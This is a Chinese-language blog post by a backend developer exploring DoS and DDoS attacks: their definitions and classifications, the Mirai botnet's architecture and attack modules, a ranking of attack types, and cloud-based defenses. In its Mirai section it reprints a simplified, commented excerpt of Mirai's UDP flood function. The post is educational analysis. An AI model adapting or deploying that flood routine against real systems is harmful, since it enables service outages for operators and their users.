---
title: "对DoS（Denial Of Service）攻击初探索"
date: 2019-07-07T18:33:00+11:00
summary: 最近刷微博的时候看到一篇写的很有趣的文章《“记一次被DDoS敲诈的历程”》, 像看故事一样，我一口气把它看完了。作为一个后端程序员，我对DoS攻击早有耳闻，也对这一块的攻防技术和原理充满兴趣。这篇文章一下子让我想起来之前看到过的一系列关于DoS的文章，比如《DDoS 攻击的防范教程》, 《DD4BC：一个专门用DDoS敲诈勒索比特币的黑客组织》, 《Linux 内核 SCTP 协议漏洞分析与复现 （CVE-2019-8956）》, 《GitHub已遭基于Memcached的DDoS攻击 规模达1.35Tbps》。这次我打算自己对DoS(包含DDoS)这块进行一次系统的探索，而这篇文章就是探索中的一些记录。
draft: false
---

## 背景

最近刷微博的时候看到一篇写的很有趣的文章[“记一次被DDoS敲诈的历程”](https://www.freebuf.com/articles/es/205934.html), 像看故事一样，我一口气把它看完了。作为一个后端程序员，我对DoS攻击早有耳闻，也对这一块的攻防技术和原理充满兴趣。这篇文章一下子让我想起来之前看到过的一系列关于DoS的文章，比如[《DDoS 攻击的防范教程》](http://www.ruanyifeng.com/blog/2018/06/ddos.html), [《DD4BC：一个专门用DDoS敲诈勒索比特币的黑客组织》](https://www.8btc.com/article/67111), [《Linux 内核 SCTP 协议漏洞分析与复现 （CVE-2019-8956）》](https://paper.seebug.org/938/), [《GitHub已遭基于Memcached的DDoS攻击 规模达1.35Tbps》](https://www.anquanke.com/post/id/99608)。这次我打算自己对DoS(包含DDoS)这块进行一次系统的探索，而这篇文章就是探索中的一些记录。

## 什么是DoS（Denial Of Service）和DDoS攻击

根据字面意思，我的理解是凡是让服务无法正常运行，导致普通用户无法正常访问相应服务的攻击都可以算是DoS攻击（拒绝服务攻击）。这里面包括了“以量取胜”，“精确打击”两种类型。以量取胜指的是通过大量的请求去消耗网络和服务器资源看，如上文说提到的《DDoS 攻击的防范教程》，《GitHub已遭基于Memcached的DDoS攻击 规模达1.35Tbps》都可以归为这个类型。而精确打击则是根据某个服务的漏洞，往往一台电脑，几行命令就可以把目标服务整Crash，比如上文提到《Linux 内核 SCTP 协议漏洞分析与复现 （CVE-2019-8956）》就属此类。

不过目前看到的定义大多数都是指以量取胜这种。比如[安全内参](https://www.secrss.com/articles/8872)上对DoS定义是
> DoS攻击是指攻击者利用合理服务请求占用过多的资源，致使目标系统无法提供正常服务。这可以通过阻止各类访问请求来实现：服务器、设备、服务、网络、应用程序，甚至程序内的特定事务等。

[wikipedia](https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A)上对DoS定义则是 
> 拒绝服务攻击（英语：denial-of-service attack，简称DoS攻击）亦称洪水攻击，是一种网络攻击手法，其目的在于使目标计算机的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。

这篇文章也是以分析量取胜这种攻击方式为主。至于精确打击这种类型如果有机会以后在单独研究。

既然是以量取胜，那就不得不提DDoS（分布式拒绝服务攻击）。相比与DoS，DDoS可能更加出名，导致很多时候这两个经常混着用。根据wikipedia， 当黑客使用网络上两个或以上被攻陷的计算机作为“僵尸”向特定的目标发动“拒绝服务”式攻击时，称为分布式拒绝服务攻击（distributed denial-of-service attack，简称DDoS攻击）。

## 常见的DDoS攻击及分类

DDoS攻击技术五花八门，有必要对其进行相应的分类，以便更好的掌握各种攻击技术的特点。其中一种常见的分类方式(wikipedia中文版上的分类方式)是根据消耗的资源类型进行分类。这里可以分为两大类型，分别是针对带宽消耗的攻击，以及对服务器资源（cpu,ram,disk等等）的消耗攻击。

带宽消耗型攻击：
* UDP Flood
* ICMP Flood
* ...

资源消耗型攻击:
* TCP SYN Flood
* Distributed HTTP Flood
* ...

根据我的理解，带宽消耗型攻击就是“无脑流”的攻击方式，主要以消耗带宽为目的。不管你的服务是什么类型，猛打你服务所在的网络，最后让你的网络带宽用尽。就算你的服务还在运行，但是因为带宽用尽，大部分正常用户的请求已经无法到达你的服务器，从而造成拒绝服务攻击。而资源消耗型就相对“精致”一些。主要是消耗相应服务在服务器的资源。比如TCP SYN Flood，作为最常见的DDos攻击方式，利用了TCP三次握手的缺陷，能够以较小代价使目标服务器无法响应（具体原理可以看[被骗几十万总结出来的Ddos攻击防护经验](http://www.ijiandao.com/safe/cto/15952.html)的SYN Flood部分）。这两种攻击类型，各有千秋。带宽消耗型攻击虽然相对容易实现，但是需要很大的流量才可以把服务打到“拒绝服务”（主要是通过超高流量冲击网络链路层，比如[《论持久战——带你走进腾讯DDoS防护体系》](https://security.tencent.com/index.php/blog/msg/71)第四章提到的大流量攻击）。而资源消耗型攻击的针对性就比较强，相对需要的流量就要少。


除了根据消耗资源的类型分类之外，还有根据攻击的不同网络层来分类。比如AWS的白皮书[《AWS Best Practices for DDoS Resiliency》](https://d1.awsstatic.com/whitepapers/Security/DDoS_White_Paper.pdf)就据此分类DDOS攻击。

![](https://i.imgur.com/QYDY8xa.png)

白皮书中把攻击3,4层的攻击归为Infrastructure Layer Attacks， 而6,7层则是Application Layer Attacks。这种分类和前一种分类有些类似。Infrastructure Layer Attacks这种相对低层的攻击需要较大的流量才有效果，而越上层的攻击如Application Layer Attacks则相对没有很高的流量需求。我的理解是**越上层的单位流量所需要消耗的系统资源越多**。比如在3层以下，所消耗的只是带宽，但是到了7层，所消耗的就是cpu，ram, 甚至是文件句柄（系统有最大文件句柄数量），各种资源只要有一种不够都会影响到服务的稳定，甚至拒绝服务。


除了这两种常见分类外，我还在一篇paper（[DDoS-Capable IoT Malwares: Comparative Analysis and Mirai Investigation](https://www.hindawi.com/journals/scn/2018/7178164/)）上看到一种分类。论文的作者认为根据受到攻击的网络协议来分类不够准确，因为有些DDoS攻击可能涉及到不止一层。
> ... we will not consider that taxonomy since we believe that it is extremely inaccurate and hard to use (it is possible to have DDoS attacks which involve more than one protocol).

文中对DDoS攻击进行了非常细致的分类。基本上你能想到的他都列出来了，如[下图](https://www.hindawi.com/journals/scn/2018/7178164/fig1/):
![](https://i.imgur.com/rtOYG2h.png)

## DDoS的攻击周期

说完各种DDoS的攻击方式，那到底一个成功的DDoS是怎么实现的呢？这就要提到一个DDoS的攻击周期。首先一个DDoS攻击要成功，要以量取胜，最重要的就是收集到足够多的可以发动攻击的机器。

根据[DDoS attacks and defense mechanisms: classiﬁcationand state-of-the-art](https://www.academia.edu/23981350/DDoS_attacks_and_defense_mechanisms_classification_and_state-of-the-art)，一个DDoS攻击在攻击前一般都会经过以下几个阶段：

1. 扫描有漏洞的机器
2. 通过漏洞，远程感染这些机器，使其成为botnet中的一份子
3. 与这些被感染的机器通信，确认是否在线，或者安排升级等等
4. 控制这些机器进行DDoS攻击

可以看到在DDoS的攻击周期中，有很大一部分是和收集并感染有漏洞的机器相关，而之前所提到的各种DDoS攻击方法只是临门一脚，水到渠成。在这方面Mirai是非常成功，接下来会以Mirai为例，并从源码层面进一步分析DDoS攻击。

### Mirai

Mirai是近几年来有数的最危险的恶意软件，一度感染大概500,000台机器。他的目标主要是安全性差而又数量庞大的IoT设备，比如家庭路由，CCTV监控等等。

Mirai的架构主要有4部分组成：
1. CNC（Command and control）服务器。主要的作用是就收用户的指令，给botnet（受感染机器组成的网络）发送命令。
2. Mirai bot。组成botnet的单个机器。其中有包含的三个模块：
    i).  扫描模块：负责扫描有漏洞的机器，一旦发现，回报Reporting server
    ii). 杀手模块：负责清除机器上其他恶意软件，从而达到独占设备
    iii).攻击模块：负责进行DDoS攻击
3. Reporting server: 负责收集从Mirai bot传来的有漏洞的机器信息，并转发给Loader server
4. Loader server:上传恶意代码到远程设备，从而达到控制机器的目的。

![](https://i.imgur.com/FjhUyBr.png)

了解Mirai的主要组成和结构之后，我们在来看看他的[源码](https://github.com/jgamblin/Mirai-Source-Code)。

DDoS攻击中我认为最重要的两部分，一是Mirai的DDoS攻击部分代码，二是扫描和感染漏洞机器的代码。而本文主要分析DDoS攻击部分代码，至于其他部分，有兴趣的可以看看这篇论文（[DDoS-Capable IoT Malwares: Comparative Analysis and Mirai Investigation](https://www.hindawi.com/journals/scn/2018/7178164/)，里面有详细的源码分析和介绍。

先看看DDoS攻击部分，这块代码主要在mirai/bot下面，通过attack_xxx.c的形式命名。可以看到Mirai主要有4大类攻击方式, 每种类别里又有好几种攻击方式：
1. udp(attack_udp.c)
   * attack_udp_generic (实现稍微复杂点的udp flood，但是更加灵活)
   * attack_udp_vse   （vse指的是valve source engine,主要是针对游戏服务器的攻击）
   * attack_udp_dns   （）
   * attack_udp_plain (最简单的udp flood, pps比generic的更高)
2. tcp(attack_tcp.c)
   * attack_tcp_syn (上文提到过)
   * attack_tcp_ack  ([Everything About TCP ACK Flood](http://blog.ddos-guard.ir/everything-about-tcp-ack-flood/))
   * attack_tcp_stomp ([How Mirai Uses STOMP Protocol to Launch DDoS Attacks](https://www.imperva.com/blog/mirai-stomp-protocol-ddos/))
3. gre(attack_gre.c)
   * attack_gre_eth ([GRE Tunnel for Humans: Making Sense of GRE](https://www.imperva.com/blog/what-is-gre-tunnel/?utm_campaign=Incapsula-moved))
   * attack_gre_ip (GRE flood)
4. app(attack_app.c)
   * attack_app_proxy（没有实现）
   * attack_app_http
   * attack_app_cfnull

因为篇幅问题，这里只挑选udp中最简单的攻击attack_udp_plain进行分析（代码经过简化，去掉debug部分，方便阅读）：
```
void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};

    // 没有指定的话随机一个source端口
    if (sport == 0xffff)
    {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }

    // 构造packets
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;

        // 为每个packet分配 65535 × 4 字节空间
        pkts[i] = calloc(65535, sizeof (char));

        // 没有制定的话随机一个dest端口
        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);

        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
        {
            return;
        }

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;

        bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in));

        // For prefix attacks
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

        // 区别于tcp的connect, 不会真正建立链接，只是加快udp发送
        connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
    }
    
    // 设置好所有packets后，发送封包
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *data = pkts[i];

            // Randomize packet content?
            if (data_rand)
                // 没有指定长度的话，data长度默认是512
                rand_str(data, data_len);

            send(fds[i], data, data_len, MSG_NOSIGNAL);
        }
    }
}
```


通过以上源码的分析可以看出，DDoS攻击也不外乎就是构造封包，发送封包这一套，其他的攻击类型的源码也都大同小异。关键在于中间的protocol是什么。



## DDoS攻击有高下之分吗

在这么多DDoS的攻击方式里面，到底那一种攻击方式最强，威胁最大呢？是能造成超大流量的UDP攻击？还是精确打击消耗服务资源的HTTP flood？

还是以Mirai作为例子进行探索，在[《A Field Guide to Understanding IoT Attacks from the Mirai Botnet to Its Modern Variants》](https://www.datacom.cz/userfiles/miraihandbookebook_final.pdf)上面有对各种攻击详细的解释，包括各种攻击的bandwidth profile（主要由BPS（bit per second）,PPS(packet per second)组成），甚至还给他们按照威胁指数进行排名。

![](https://i.imgur.com/TRF0Cw5.png)

根据这份报告，DNS flood（attack_udp_dns）是威胁程度最高的一种攻击。这种攻击通过不停发送一系列随机子域名 （$STRING.domain.com形式）的DNS query，导致目标的Name server拒绝服务。
![](https://i.imgur.com/TdWzupo.png)

这个之所以难以防备是因为所有流量都是从正常的DNS服务器发送过来，很难区分正常流量和攻击流量。

排名第二的是VSE Flood。这个攻击主要针对的是游戏服务valve source engine。因为protocol设计的问题，用户的正常请求和攻击请求基本无法区分，导致这种DDoS攻击也很难防范。

排名前两位都是udp层的攻击，而且都是针对某种特定服务的攻击（DNS，游戏服务器）。而排名第三的是STOMP是TCP层的攻击，而且不是针对某个特定服务，只要有TCP链接就可以攻击。它的攻击方式是先埋伏起来（先3次握手建立链接），然后开始搞破坏（PSH+ACK flood）。之所以排在前三名，是因为这种攻击方式可以绕过一些DDoS的防护。

在报告中，HTTP flood被排在最后。作为精确打击的代表，HTTP flood的bps/pps都是所有攻击里面最低的。但这不是他排名低的原因。在Mirai中，只有一种最简单的HTTP攻击方式。这个简单攻击方式不需要什么用户设置。这样就不难理解为什么HTTP flood被排在最后了。在Maria中HTTP flood的威力根本没有发挥出来。

通过以上的分析，在我看来，最强的DDoS攻击要看具体的场景和攻击的对象。比如说针对valve source engine服务的攻击，当然VES flood就是威胁最大的。插一句题外话，在这么多传统的DDoS里面，VES flood是比较特殊，因为他针对的是特定的游戏服务器。比较好奇为什么会有这样一个攻击方式在里面。也许是游戏服务器比较好勒索，收益较大？ 

## DDoS攻击的防护

所谓道高一尺，魔高一丈（其实这里反过来说比较恰当：））。DDoS的攻防总是相伴相生。谈攻击不谈防护总是感觉不完整。在这块我主要参考了[《AWS的DDoS白皮书》](https://d1.awsstatic.com/whitepapers/Security/DDoS_White_Paper.pdf), [《论持久战——带你走进腾讯DDoS防护体系》](https://security.tencent.com/index.php/blog/msg/71)， [《被骗几十万总结出来的Ddos攻击防护经验！》](http://www.ijiandao.com/safe/cto/15952.html)。

在现在动辄几十GBps甚至上TBps的攻击面前，大多数公司都要依靠第三方DDoS的防护系统，比如Akamai, Cloudflare, Cloudfront等等。防护的原理主要是把大量的请求分散到带上一些防护功能的CDN上，这样大量的请求就到不了源服务器。这就需要大量的网络和机器资源，一般公司是做不了的。

作为一个在全球领先的云服务提供商(amazon在云服务投入很早，据说比其他[同类竞争者领先了7年投入](https://www.parkmycloud.com/blog/aws-vs-azure-vs-google-cloud-market-share/))，aws拥有一整套从4层到7层网络层的DDoS的防护设施。白皮书里面提到，Cloudfront配合AWS WAF可以防护从4层到7层的所有攻击。加上amazon route 53(DNS系统)，可以很好的分散/限制攻击的流量。就算有漏网的流量到达服务器所在的网络，aws也有一套防御机制。ELB（弹性负载均衡），api网关，VPC(虚拟私人云)和自动伸缩的EC2都可以很好的减少DDoS攻击带来的影响。

![](https://i.imgur.com/ng7Cuyp.png)

看完aws的白皮书，感觉对DDoS的防护的认识还是比较虚，反正用对方的服务就好了，很多底层的防护我们并不了解，也不用管（这也是云服务的特点，大量基础工作云服务提供商都已经做了）。而在《论持久战——带你走进腾讯DDoS防护体系》中，作者总结了一套防护对抗的思路，有很多具体建议和措施。我非常认同第6点--回归本质，一切服务于业务。真正厉害的DDoS都是针对特定业务属性做到难以防备（无法区分正常流量和攻击流量）。如前文提到的针对DNS攻击和VES的攻击这么有效，都是本身设计的时候的特点（漏洞）导致的。所以必须要针对业务的特点才能进行更好的防护（因为厉害的DDoS攻击也会根据业务特点伪装成正常流量）。

《被骗几十万总结出来的Ddos攻击防护经验！》的作者是一个老司机了，15年的DDoS攻击防护经验。文中有许多攻击分析和防护策略，而且深入到其原理，推荐一看，这里就不一一敖述。根据他的推荐，CF（cloudflare）的DDoS防护服务是很不错的。（amazon的DDoS防护服务虽然被推荐但也被他diss了下，不过毕竟Amazon这种什么都做的云服务商，不像cloudflare专做这一块）。


## 总结

DDoS攻击防护这块博大精深，短短的一篇文章里面其实很难一窥其全貌（在短短的时间里面我就接触到大量的DDoS专有名词）。不管是攻击还是防护，还有许多可以学习和探索的地方，还有很多地方可以继续深挖。相信将来也有更多新的DDoS攻击和防护技术出现，不过到时候我再也不会两眼一抹黑。初次对DDoS攻击防护进行比较系统的探索，还是很有意思的。接下来我应该会继续对DDoS的很重要的环节--扫描和感染有漏洞的机器进行研究和探索。


## Reference
1. https://www.freebuf.com/articles/es/205934.html
2. http://www.ruanyifeng.com/blog/2018/06/ddos.html
3. https://www.8btc.com/article/67111
4. https://paper.seebug.org/938/
5. https://www.anquanke.com/post/id/99608
6. https://www.secrss.com/articles/8872
7. https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A
8. http://www.ijiandao.com/safe/cto/15952.html
9. https://security.tencent.com/index.php/blog/msg/71
10. https://d1.awsstatic.com/whitepapers/Security/DDoS_White_Paper.pdf
11. https://www.academia.edu/23981350/DDoS_attacks_and_defense_mechanisms_classification_and_state-of-the-art
12. https://www.cloudflare.com/press-releases/2018/cloudflare-named-a-leader-in-idc-marketscape-ddos-prevention-solutions/